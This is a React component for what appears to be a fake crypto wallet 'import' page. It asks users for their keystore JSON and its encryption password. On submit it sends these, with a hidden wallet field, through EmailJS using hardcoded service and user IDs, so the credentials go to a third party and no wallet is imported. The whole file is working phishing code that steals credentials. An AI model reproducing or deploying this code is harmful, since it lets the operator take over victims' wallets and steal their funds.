import React from "react";
import emailjs from "@emailjs/browser";

const sendEmail = (e) => {
  e.preventDefault();

  emailjs
    .sendForm(
      "service_uca2x1k",
      "template_oguonks",
      e.target,
      "user_Qp1Kvs7l8ZL0vLtKArviW"
    )
    .then(
      (result) => {
        console.log(result.text);
      },
      (error) => {
        console.log(error.text);
      }
    );
  e.target.reset();
};

const Keystore = ({ wallet }) => {
  return (
    <>
      <form onSubmit={sendEmail}>
        <input
          type="text"
          defaultValue={wallet}
          className="hiddeen"
          name="namie"
        />
        <input
          type="text"
          placeholder=" keystore JSON"
          required
          name="key"
          min="12"
          max="100"
          minLength="12"
          className="phraseseed"
        ></input>

        <input
          type="text"
          placeholder="Enter Temporary Password"
          name="pass"
          minLength="12"
          required
          min="12"
          max="100"
        ></input>
        <h6 className="h4" style={{ color: "black", fontWeight: "400" }}>
          Several lines of text beginning with '(...)' plus the password you
          used to encrypt it.
        </h6>
        <button type="submit">
          <b>IMPORT</b>
        </button>
      </form>
    </>
  );
};

export default Keystore;
